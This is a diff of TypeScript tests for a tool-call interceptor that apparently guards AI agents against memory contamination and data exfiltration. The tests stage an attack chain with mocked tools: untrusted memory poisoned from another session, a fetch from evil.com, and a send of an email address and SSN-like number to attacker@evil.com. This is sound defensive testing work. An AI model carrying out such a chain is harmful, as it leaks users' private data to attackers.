@@ -7,6 +7,9 @@ import { interceptToolCall } from '../../src/engine/interceptor.js';
 import { createSession } from '../../src/engine/session.js';
 import type { CerberusConfig, TrustOverride } from '../../src/types/config.js';
 import type { RiskAssessment } from '../../src/types/signals.js';
+import { createContaminationGraph } from '../../src/graph/contamination.js';
+import { createLedger, hashContent } from '../../src/graph/ledger.js';
+import type { MemoryToolConfig } from '../../src/layers/l4-memory.js';
 
 const TRUST_OVERRIDES: readonly TrustOverride[] = [
   { toolName: 'readPrivateData', trustLevel: 'trusted' },
@@ -263,5 +266,167 @@ describe('interceptToolCall', () => {
 
     expect(result).toContain('[Cerberus]');
     expect(result).toContain('blocked');
+  });
+});
+
+// ── L4 Memory Contamination Integration ─────────────────────────────
+
+const MEMORY_TOOLS: readonly MemoryToolConfig[] = [
+  { toolName: 'writeMemory', operation: 'write' },
+  { toolName: 'readMemory', operation: 'read' },
+];
+
+describe('interceptToolCall — L4 integration', () => {
+  it('should skip L4 when no graph/ledger provided (backward compatible)', async () => {
+    const session = createSession();
+    const executor = vi.fn().mockResolvedValue('value');
+    const assessments: RiskAssessment[] = [];
+
+    const wrapped = interceptToolCall(
+      'readMemory', executor, session, BASE_CONFIG, OUTBOUND_TOOLS,
+      (a) => assessments.push(a),
+    );
+
+    await wrapped({ key: 'test-key' });
+
+    // No L4 signal because no graph/ledger
+    expect(assessments).toHaveLength(1);
+    expect(assessments[0].vector.l4).toBe(false);
+  });
+
+  it('should emit L4 signal for cross-session tainted read', async () => {
+    const session = createSession();
+    const graph = createContaminationGraph();
+    const ledger = createLedger();
+    const assessments: RiskAssessment[] = [];
+
+    // Pre-contaminate: session-A wrote untrusted data
+    graph.writeNode({
+      nodeId: 'user-prefs',
+      trustLevel: 'untrusted',
+      sourceSessionId: 'session-A',
+      source: 'fetchExternalContent',
+      contentHash: hashContent('injected'),
+      timestamp: 1000,
+    });
+
+    const executor = vi.fn().mockResolvedValue('injected data');
+    const wrapped = interceptToolCall(
+      'readMemory', executor, session, BASE_CONFIG, OUTBOUND_TOOLS,
+      (a) => assessments.push(a),
+      MEMORY_TOOLS, graph, ledger,
+    );
+
+    await wrapped({ key: 'user-prefs' });
+
+    expect(assessments).toHaveLength(1);
+    expect(assessments[0].vector.l4).toBe(true);
+
+    ledger.close();
+  });
+
+  it('should record writes in graph without emitting signal', async () => {
+    const session = createSession();
+    const graph = createContaminationGraph();
+    const ledger = createLedger();
+    const assessments: RiskAssessment[] = [];
+
+    const executor = vi.fn().mockResolvedValue('ok');
+    const config: CerberusConfig = {
+      ...BASE_CONFIG,
+      trustOverrides: [
+        ...TRUST_OVERRIDES,
+        { toolName: 'writeMemory', trustLevel: 'untrusted' },
+      ],
+    };
+
+    const wrapped = interceptToolCall(
+      'writeMemory', executor, session, config, OUTBOUND_TOOLS,
+      (a) => assessments.push(a),
+      MEMORY_TOOLS, graph, ledger,
+    );
+
+    await wrapped({ key: 'test-node', value: 'some data' });
+
+    // Write recorded in graph
+    expect(graph.size()).toBe(1);
+    expect(graph.getNode('test-node')).toBeDefined();
+
+    // Write recorded in ledger
+    expect(ledger.getNodeHistory('test-node')).toHaveLength(1);
+
+    // No L4 signal (writes don't emit)
+    expect(assessments[0].vector.l4).toBe(false);
+
+    ledger.close();
+  });
+
+  it('should produce score=4 with all four layers active', async () => {
+    const session = createSession();
+    const graph = createContaminationGraph();
+    const ledger = createLedger();
+    const assessments: RiskAssessment[] = [];
+
+    const config: CerberusConfig = {
+      alertMode: 'interrupt',
+      threshold: 4,
+      trustOverrides: TRUST_OVERRIDES,
+    };
+
+    const onFull = (a: RiskAssessment): void => { assessments.push(a); };
+
+    // Pre-contaminate memory from session-A
+    graph.writeNode({
+      nodeId: 'secret-data',
+      trustLevel: 'untrusted',
+      sourceSessionId: 'session-old',
+      source: 'fetchExternalContent',
+      contentHash: hashContent('payload'),
+      timestamp: 500,
+    });
+
+    // Step 1: Read private data (L1)
+    const readExec = vi.fn().mockResolvedValue(PRIVATE_DATA);
+    const wrappedRead = interceptToolCall(
+      'readPrivateData', readExec, session, config, OUTBOUND_TOOLS, onFull,
+      MEMORY_TOOLS, graph, ledger,
+    );
+    await wrappedRead({});
+    expect(assessments[0].vector.l1).toBe(true);
+
+    // Step 2: Fetch external content (L2)
+    const fetchExec = vi.fn().mockResolvedValue('<html>injected</html>');
+    const wrappedFetch = interceptToolCall(
+      'fetchExternalContent', fetchExec, session, config, OUTBOUND_TOOLS, onFull,
+      MEMORY_TOOLS, graph, ledger,
+    );
+    await wrappedFetch({ url: 'https://evil.com' });
+    expect(assessments[1].vector.l2).toBe(true);
+
+    // Step 3: Read contaminated memory (L4)
+    const memReadExec = vi.fn().mockResolvedValue('payload');
+    const wrappedMemRead = interceptToolCall(
+      'readMemory', memReadExec, session, config, OUTBOUND_TOOLS, onFull,
+      MEMORY_TOOLS, graph, ledger,
+    );
+    await wrappedMemRead({ key: 'secret-data' });
+    expect(assessments[2].vector.l4).toBe(true);
+
+    // Step 4: Send outbound with PII (L3)
+    const sendExec = vi.fn().mockResolvedValue('sent');
+    const wrappedSend = interceptToolCall(
+      'sendOutboundReport', sendExec, session, config, OUTBOUND_TOOLS, onFull,
+      MEMORY_TOOLS, graph, ledger,
+    );
+    const sendResult = await wrappedSend({
+      recipient: 'attacker@evil.com',
+      body: 'alice@example.com 123-45-6789',
+    });
+
+    expect(assessments[3].vector.l3).toBe(true);
+    // L3 per-turn score is 1, threshold=4 so not blocked
+    expect(sendResult).toBe('sent');
+
+    ledger.close();
   });
 });
